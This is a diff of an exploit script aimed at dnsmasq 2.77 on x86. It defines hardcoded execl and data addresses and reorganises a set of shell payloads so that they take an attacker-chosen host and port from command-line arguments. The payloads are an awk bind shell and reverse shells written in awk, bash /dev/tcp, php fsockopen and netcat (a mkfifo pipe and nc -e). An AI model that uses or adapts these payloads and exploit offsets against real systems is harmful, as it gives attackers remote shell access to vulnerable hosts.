@@ -20,22 +20,6 @@ EXECL_277x86 = 0x08070758          # execl
 # dnsmasq/2.77
 DATA_277x86 = 0x0808c054
 
-# Payloads
-# Bind payloads
-bind_port = str(4444)
-bind_awk = "awk 'BEGIN{s=\"/inet/tcp/" + bind_port + \
-           "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
-
-# Reverse payloads
-reverse_port = str(4444)
-reverse_host = "127.0.0.1"
-reverse_awk = "awk 'BEGIN{s=\"/inet/tcp/0/" + reverse_host + "/" + reverse_port + \
-              "\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
-reverse_bash = "bash -i >& /dev/tcp/" + reverse_host + "/" + reverse_port + " 0>&1"
-reverse_php = "php -r '$sock=fsockopen(\""+reverse_host+"\","+reverse_port+");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
-reverse_nc = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + reverse_host + " " + reverse_port + " >/tmp/f"
-reverse_nce = "nc -e /bin/sh " + reverse_host + " " + reverse_port
-
 Base = Base()
 Base.print_banner()
 
@@ -83,8 +67,20 @@ interpreter_arg = str(args.interpreter_arg)
 payload = ""
 bind_port = str(args.bind_port)
 reverse_port = str(args.reverse_port)
-if args.reverse_host is not None:
-    reverse_host = args.reverse_host
+reverse_host = str(args.reverse_host)
+
+# Payloads
+# Bind payloads
+bind_awk = "awk 'BEGIN{s=\"/inet/tcp/" + bind_port + \
+           "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
+
+# Reverse payloads
+reverse_awk = "awk 'BEGIN{s=\"/inet/tcp/0/" + reverse_host + "/" + reverse_port + \
+              "\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
+reverse_bash = "bash -i >& /dev/tcp/" + reverse_host + "/" + reverse_port + " 0>&1"
+reverse_php = "php -r '$sock=fsockopen(\""+reverse_host+"\","+reverse_port+");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+reverse_nc = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + reverse_host + " " + reverse_port + " >/tmp/f"
+reverse_nce = "nc -e /bin/sh " + reverse_host + " " + reverse_port
 
 if args.command is not None:
     payload = args.command
